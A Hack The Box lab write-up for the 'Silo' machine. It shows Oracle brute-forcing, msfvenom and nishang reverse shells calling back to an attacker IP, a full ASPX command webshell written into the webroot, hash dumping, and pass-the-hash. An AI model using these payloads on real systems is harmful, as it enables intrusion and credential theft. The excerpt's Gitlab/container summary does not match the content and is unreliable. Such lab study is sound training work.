---
layout: single
title: Silo - Hack The Box
excerpt: "A vulnerable instance of Gitlab to obtain a shell. Mount the host filesystem within the container to access the root flag" 
date: 2022-09-24
classes: wide
header:
  teaser: /assets/images/htb-writeup-silo/silo_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - ODAT
  - Oracle
  - Metasploit
  - sqlplus64
  - Volatility
---

![](/assets/images/htb-writeup-silo/silo_logo.png)

Interesting machine that allows you to do things in a automated way or manually. I have learned about manage files in Oracle and the usage of Volatility.

## Portscan
```bash
❯ nmap -sCV -p80,135,139,445,1521,5985,8080,47001,49152,49153,49154,49155,49159,49160,49161,49162 10.129.95.188 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 14:45 CEST
Nmap scan report for 10.129.95.188
Host is up (0.047s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http         Oracle XML DB Enterprise Edition httpd
|_http-server-header: Oracle XML DB/Oracle Database
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=XDB
|_http-title: 400 Bad Request
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.0.2:
|_    Message signing enabled but not required
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
| smb2-time:
|   date: 2022-09-23T12:47:15
|_  start_date: 2022-09-23T12:08:02
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
```
After some tests...
```bash
❯ whatweb http://10.129.95.188:80
ERROR Opening: http://10.129.95.188:80 - execution expired
❯ curl -s -X GET http://10.129.95.188:80
❯ rpcclient -U "" 10.129.95.188 -N
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
❯ smbclient -L //10.129.95.188 -N
do_connect: Connection to 10.129.95.188 failed (Error NT_STATUS_IO_TIMEOUT)
❯ crackmapexec smb 10.129.95.188
SMB         10.129.95.188   445    SILO             [*] Windows Server 2012 R2 Standard 9600 x64 (name:SILO) (domain:SILO) (signing:False) (SMBv1:True)
❯ smbmap -H 10.129.95.188
[!] Authentication error on 10.129.95.188
❯ smbmap -H 10.129.95.188 -u 'null'
[!] Authentication error on 10.129.95.188
```
Oracle Database calls our attention. We could solve this machine using [ODAT](https://github.com/quentinhardy/odat) or manually
## ODAT
1. Installation
```bash
git clone https://github.com/quentinhardy/odat
cd odat/
git submodule init
git submodule update
sudo apt-get install libaio1 python3-dev alien python3-pip
```
Get instant client basic, sdk(devel) and sqlplus from the Oracle web site
```bash
❯ ls
oracle-instantclient-basic-21.7.0.0.0-1.el8.x86_64.rpm
oracle-instantclient-devel-21.7.0.0.0-1.el8.x86_64.rpm
oracle-instantclient-sqlplus-21.7.0.0.0-1.el8.x86_64.rpm
❯ sudo alien --to-deb *
❯ sudo dpkg -i *.deb
```
We add these variables in our zshrc checking the correct version. How? 
```bash
❯ ls /usr/lib/oracle
21
```
In my case is 21, so the final result in my zshrc will be: 
```bash
export ORACLE_HOME=/usr/lib/oracle/21/client64/
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
export PATH=${ORACLE_HOME}bin:$PATH
```
Last step:
```bash
❯ pip3 install cx_Oracle
```  
This will be enough to use the tool.
```bash
❯ python3 odat.py --help
```
2. Sidguesser
> 1. Using ODAT
```bash
❯ python3 odat.py sidguesser -s 10.129.95.188 -p 1521
[1] (10.129.95.188:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.129.95.188:1521 server
[+] 'XE' is a valid SID
```
> 2. Using metasploit
```bash
❯ service postgresql start
❯ msfconsole -q
[msf](Jobs:0 Agents:0) >> search oracle
   80   auxiliary/scanner/oracle/sid_brute                                                     normal     No     Oracle TNS Listener SID Bruteforce
[msf](Jobs:0 Agents:0) >> use 80
[msf](Jobs:0 Agents:0) auxiliary(scanner/oracle/sid_brute) >> set rhosts 10.129.95.188
rhosts => 10.129.95.188
[msf](Jobs:0 Agents:0) auxiliary(scanner/oracle/sid_brute) >> run
[*] 10.129.95.188:1521    - Checking 572 SIDs against 10.129.95.188:1521
[*] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - Checking 'LINUX8174'...
[*] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - Refused 'LINUX8174'
[*] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - Checking 'ORACLE'...
[*] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - Refused 'ORACLE'
[*] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - Checking 'XE'...
[+] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - 'XE' is valid
[+] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - 'PLSEXTPROC' is valid
^C[*] 10.129.95.188:1521    - Caught interrupt from the console...
[*] Auxiliary module execution completed
```
3. Passwordguesser.
> 1. Using ODAT
```bash
❯ head -n 3 accounts/accounts.txt
abm/abm
adams/wood
adldemo/adldemo
```
By default, ODAT is using accounts/accounts.txt as dictionary. But we will use other with the correct format that it supports.
```bash
❯ locate oracle_ | grep pass
/usr/share/metasploit-framework/data/wordlists/hci_oracle_passwords.csv
/usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv
/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt (We choose this ==> auxiliary/scanner/oracle/oracle_login)
```
Change the format
```bash
❯ cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr ' ' '/' > ourNewDictionary.txt
```
Let's utilize our custom dictionary
```bash
❯ python3 odat.py passwordguesser -s 10.129.95.188  -d XE --accounts-file ourNewDictionary.txt
[+] Valid credentials found: scott/tiger. Continue...
100% |##################################################################| Time: 00:32:37
[+] Accounts found on 10.129.95.188:1521/sid:XE:
scott/tiger
```
> 2. Using metasploit (It may not work due to case-sensitive Oracle change)
```bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/oracle/sid_brute) >> search scanner/oracle
   3   auxiliary/scanner/oracle/oracle_login                        normal  No     Oracle RDBMS Login Utility
```
4. Obtain a shell
Let's test if we are able to see the /etc/hosts on the Windows machine
```bash
❯ python3 odat.py utlfile -s 10.129.95.188 -d 'XE' -U 'scott' -P 'tiger' --getFile 'C:\Windows\System32\drivers\etc\' 'hosts' 'hosts' --sysdba
[1] (10.129.95.188:1521): Read the hosts file stored in C:\Windows\System32\drivers\etc\ on the 10.129.95.188 server
[+] Data stored in the hosts file sored in C:\Windows\System32\drivers\etc\ (copied in hosts locally):
b"# Copyright (c) 1993-2009 Microsoft Corp.\n#\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n#\n# This file contains the mappings of IP addresses to host names. Each\n# entry should be kept on an individual line. The IP address should\n# be placed in the first column followed by the corresponding host name.\n# The IP address and the host name should be separated by at least one\n# space.\n#\n# Additionally, comments (such as these) may be inserted on individual\n# lines or following the machine name denoted by a '#' symbol.\n#\n# For example:\n#\n#      102.54.94.97     rhino.acme.com          # source server\n#       38.25.63.10     x.acme.com              # x client host\n\n# localhost name resolution is handled within DNS itself.\n#\t127.0.0.1       localhost\n#\t::1             localhost\n"
```
It works. We want to establish a reverse shell with netcat. In order to be able to carry it out, we need to create a payload and upload it into the victim machine.
```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.87 LPORT=4126 -f exe -o badshell.exe
```
```bash
❯ python3 odat.py utlfile -s 10.129.95.188 -d 'XE' -U 'scott' -P 'tiger' --putFile 'C:\Windows\Temp\' 'shell.exe' 'badshell.exe' --sysdba
[1] (10.129.95.188:1521): Put the badshell.exe local file in the C:\Windows\Temp\ folder like shell.exe on the 10.129.95.188 server
[+] The badshell.exe file was created on the C:\Windows\Temp\ directory on the 10.129.95.188 server like the shell.exe file
```
It would only be necessary to execute it.
```bash
❯ python3 odat.py externaltable -s 10.129.95.188 -d 'XE' -U 'scott' -P 'tiger' --exec 'C:\Windows\Temp\' 'shell.exe' --sysdba
[1] (10.129.95.188:1521): Execute the shell.exe command stored in the C:\Windows\Temp\ path
```
In our machine,
```bash
❯ rlwrap nc -lvnp 4126
listening on [any] 4126 ...
connect to [10.10.14.87] from (UNKNOWN) [10.129.95.188] 49178
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
nt authority\system
```
***

## Manually

This DB has default credentials [scott/tiger](https://www.complexsql.com/what-are-default-username-and-password-for-oracle-list/)

```bash
❯ sqlplus64 scott/tiger@10.129.95.188:1521/XE as sysdba
Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```
This two commands show us our privileges.
```sql
SQL> select * from session_privs;
SQL> select * from user_role_privs;
```
Let's read a file to test
```sql
SQL>declare
   f utl_file.file_type;
   s varchar(400);
begin
   f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');
   utl_file.get_line(f,s);
   utl_file.fclose(f);
   dbms_output.put_line(s);
end;

SQL> set serveroutput ON
SQL> /
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

PL/SQL procedure successfully completed.
```
Do I have write privileges?
```sql
SQL> declare
  2    f utl_file.file_type;
  s varchar(6000) := 'Only for a test';
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'firsttest.txt','W');
  utl_file.put_line(f,s);
  utl_file.fclose(f);
end;
  3    4    5    6    7    8    9
 10
 11  /

PL/SQL procedure successfully completed.
```
```bash
❯ curl -s -X GET http://10.129.95.188:80/firsttest.txt
Only for a test
```   

Can I upload a webshell? It is recommended that the size of the webshell may be lower than 1024 bytes.
I will use this webshell and downsize.
```bash
❯ cp /usr/share/webshells/aspx/cmdasp.aspx ~/silo/exploits
❯ sed -z 's/\n//g' cmdasp.aspx  | xclip -selection clipboard
```

```sql
SQL> declare
  2    f utl_file.file_type;
  s varchar(6000) := '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg"  runat="server" Width="250px"></asp:TextBox><asp:Button id="testing"  runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText" runat="server">Command:</asp:Label></form></body></HTML>';
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'BadWebShellToHack.aspx','W');
  utl_file.put_line(f,s);
  utl_file.fclose(f);
end;
  3    4    5    6    7    8    9
 10  /

PL/SQL procedure successfully completed.
```
![](/assets/images/htb-writeup-silo/silo1.png)

For a better shell, let's use nishang.
```bash
git clone https://github.com/samratashok/nishang
❯ ls
❯ git clone https://github.com/samratashok/nishang
Cloning into 'nishang'...
remote: Enumerating objects: 1699, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 1699 (delta 2), reused 4 (delta 1), pack-reused 1691
Receiving objects: 100% (1699/1699), 10.88 MiB | 14.94 MiB/s, done.
Resolving deltas: 100% (1061/1061), done.
❯ ls
 nishang
❯ cp nishang/Shells/Invoke-PowerShellTcp.ps1  .
❯ nvim Invoke-PowerShellTcp.ps1 #We add Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 4126 at the end of the script.
❯ ls
 nishang   Invoke-PowerShellTcp.ps1
❯ mv Invoke-PowerShellTcp.ps1 badReverseShell.ps1
❯ python3 -m http.server 80 #Share this file
```
I prefer to add this line at the end of the script
```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 4127
```
You only have to wait for the connection
```bash
❯ rlwrap nc -lvnp 4127
listening on [any] 4127 ...
connect to [10.10.14.9] from (UNKNOWN) [10.129.80.186] 49171
Windows PowerShell running as user SILO$ on SILO
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
```

What version of Windows is? (Different ways)
```powershell
C:\Users\Administrator\Desktop>systeminfo | findstr /B /I "os"
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free

C:\Users\Administrator\Desktop>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

Now, we need to escalate privileges. There is a interesting file near the user.txt
```powershell
    Directory: C:\users\phineas\desktop


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---          1/5/2018  10:56 PM        300 Oracle issue.txt
-ar--         9/25/2022  10:15 PM         34 user.txt


PS C:\users\phineas\desktop>get-content "Oracle issue.txt"
Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
?%Hm8646uC$
```
If we use this password, we will get an error

![](/assets/images/htb-writeup-silo/silo2.png)


It is a encoding error. First, we could try to see it in our machine. If that does not work we can Base64 encode the file in the victim machine

Transfer the file with impacket-smbserver
- In our machine
```bash
❯ sudo impacket-smbserver shareCreatedToCheckThePassword $(pwd) -smb2support -username m1l0js -password m1l0js
```
- In the victim machine
![](/assets/images/htb-writeup-silo/silo3.png)


It does not work. We still see the '?' which means that our encoding is not able to represent the correct value. So, let's Base64 encode the file
- In the victim machine
```powershell
PS C:\users\phineas\desktop>
$ContentOfTheFile = Get-Content "Oracle issue.txt"
$FileEncoded = [System.Text.Encoding]::UTF8.GetBytes($ContentOfTheFile)
[System.Convert]::ToBase64String($FileEncoded)
U3VwcG9ydCB2ZW5kb3IgZW5nYWdlZCB0byB0cm91Ymxlc2hvb3QgV2luZG93cyAvIE9yYWNsZSBwZXJmb3JtYW5jZSBpc3N1ZSAoZnVsbCBtZW1vcnkgZHVtcCByZXF1ZXN0ZWQpOiAgRHJvcGJveCBsaW5rIHByb3ZpZGVkIHRvIHZlbmRvciAoYW5kIHBhc3N3b3JkIHVuZGVyIHNlcGFyYXRlIGNvdmVyKS4gIERyb3Bib3ggbGluayAgaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2gvNjlza3J5emZzemI3ZWxxL0FBRFpuUUViYnFEb0lmNUwyZDBQQnhFTmE/ZGw9MCAgbGluayBwYXNzd29yZDogwqMlSG04NjQ2dUMk
```
- In our machine
```bash
❯ echo -n U3VwcG9ydCB2ZW5kb3IgZW5nYWdlZCB0byB0cm91Ymxlc2hvb3QgV2luZG93cyAvIE9yYWNsZSBwZXJmb3JtYW5jZSBpc3N1ZSAoZnVsbCBtZW1vcnkgZHVtcCByZXF1ZXN0ZWQpOiAgRHJvcGJveCBsaW5rIHByb3ZpZGVkIHRvIHZlbmRvciAoYW5kIHBhc3N3b3JkIHVuZGVyIHNlcGFyYXRlIGNvdmVyKS4gIERyb3Bib3ggbGluayAgaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2gvNjlza3J5emZzemI3ZWxxL0FBRFpuUUViYnFEb0lmNUwyZDBQQnhFTmE/ZGw9MCAgbGluayBwYXNzd29yZDogwqMlSG04NjQ2dUMk | base64 -d
Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):  Dropbox link provided to vendor (and password under separate cover).  Dropbox link  https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0  link password: £%Hm8646uC$
```
Download the zip
![](/assets/images/htb-writeup-silo/silo4.png)


```bash
❯ ls
 MEMORY DUMP.zip
❯ unzip MEMORY\ DUMP.zip
Archive:  MEMORY DUMP.zip
warning:  stripped absolute path spec from /
mapname:  conversion of  failed
 extracting: SILO-20180105-221806.zip
❯ ls
 MEMORY DUMP.zip   SILO-20180105-221806.zip
❯ file SILO-20180105-221806.zip
SILO-20180105-221806.zip: Zip archive data, at least v2.0 to extract
❯ unzip SILO-20180105-221806.zip
Archive:  SILO-20180105-221806.zip
  inflating: SILO-20180105-221806.dmp
❯ ls
 MEMORY DUMP.zip   SILO-20180105-221806.dmp   SILO-20180105-221806.zip
❯ file SILO-20180105-221806.dmp
SILO-20180105-221806.dmp: MS Windows 64bit crash dump, full dump, 261996 pages
```

We will use Volatility to analyze this file. You could search more info about this tool in sites like [this](https://www.varonis.com/blog/how-to-use-volatility) one or [this](https://blog.onfvp.com/post/volatility-cheatsheet/)

```bash```

```bash
❯ python3 volatility3/vol.py -f SILO-20180105-221806.dmp  windows.hashdump.Hashdump
Volatility 3 Framework 2.4.0
Progress:  100.00               PDB scanning finished
User    rid     lmhash  nthash

Administrator   500     aad3b435b51404eeaad3b435b51404ee        9e730375b7cbcebf74ae46481e07b0c7
Guest           501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
Phineas         1002    aad3b435b51404eeaad3b435b51404ee        8eacdd67b77749e65d3b3d5c110b0969
```

```bash
❯ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 htb.local/administrator@10.129.145.237

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
silo\administrator

C:\>[-]
❯ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 htb.local/administrator@10.129.145.237

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.129.145.237.....
[*] Found writable share ADMIN$
[*] Uploading file LcVVnEZn.exe
[*] Opening SVCManager on 10.129.145.237.....
[*] Creating service MtAu on 10.129.145.237.....
[*] Starting service MtAu.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
